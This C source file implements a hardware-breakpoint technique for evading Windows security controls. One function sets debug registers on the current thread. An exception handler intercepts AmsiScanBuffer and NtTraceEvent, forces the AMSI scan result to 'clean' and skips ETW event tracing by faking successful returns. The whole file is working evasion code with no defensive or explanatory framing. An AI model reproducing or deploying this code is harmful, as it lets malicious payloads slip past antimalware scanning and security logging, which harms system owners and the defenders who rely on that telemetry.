#include <Windows.h>
#include <stdio.h>
#include <ntstatus.h>

BOOL HwbpEngineBreakpoint(
	_In_ ULONG Position,
	_In_ PVOID Function
) {
	CONTEXT Context = {};

	SecureZeroMemory(&Context, sizeof(Context));

	Context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (!GetThreadContext(GetCurrentThread(), &Context)) {
		printf("[-] GetThreadContext Failed with Error: %lx\n", GetLastError());
		return FALSE;
	}
	if (Function) {
		(&Context.Dr0)[Position] = (UINT_PTR)Function;

		Context.Dr7 &= ~(3ull << (16 + 4 * Position));
		Context.Dr7 &= ~(3ull << (18 + 4 * Position));
		Context.Dr7 |= 1ull << (2 * Position);
	}
	else {
		(&Context.Dr0)[Position] = 0;
		Context.Dr7 &= ~(1ull << (2 * Position));
	}

	if (!SetThreadContext(GetCurrentThread(), &Context)) {
		printf("[-] SetThreadContext Failed with Error: %lx\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL HwbpEngineHandler(
	_Inout_ PEXCEPTION_POINTERS Exceptions
) {
	LONG			  Result = {};
	PVOID			  AmsiAddress = {};
	PVOID			  EtwAddress = {};
	PEXCEPTION_RECORD Exception = {};
	PCONTEXT		  Context = {};
	UINT_PTR		  Return = {};
	PULONG			  ScanResult = {};

	AmsiAddress = GetProcAddress(GetModuleHandleA("amsi.dll"), "AmsiScanBuffer");
	EtwAddress = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
	Exception = Exceptions->ExceptionRecord;
	Context = Exceptions->ContextRecord;

	if (Exception->ExceptionCode == EXCEPTION_SINGLE_STEP)
	{
		if (Exception->ExceptionAddress == AmsiAddress)
		{
			Return = *(PULONG_PTR)Context->Rsp;
			ScanResult = (PULONG)(*(PULONG_PTR)(Context->Rsp + (6 * sizeof(PVOID))));
			*ScanResult = 0;
			Context->Rip = Return;
			Context->Rsp += sizeof(PVOID);
			Context->Rax = S_OK;

			return EXCEPTION_CONTINUE_EXECUTION;
		}

		if (Exception->ExceptionAddress == EtwAddress)
		{
			Context->Rip = *(PULONG_PTR)Context->Rsp;
			Context->Rsp += sizeof(PVOID);
			Context->Rax = STATUS_SUCCESS;
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}

	return EXCEPTION_CONTINUE_SEARCH;
}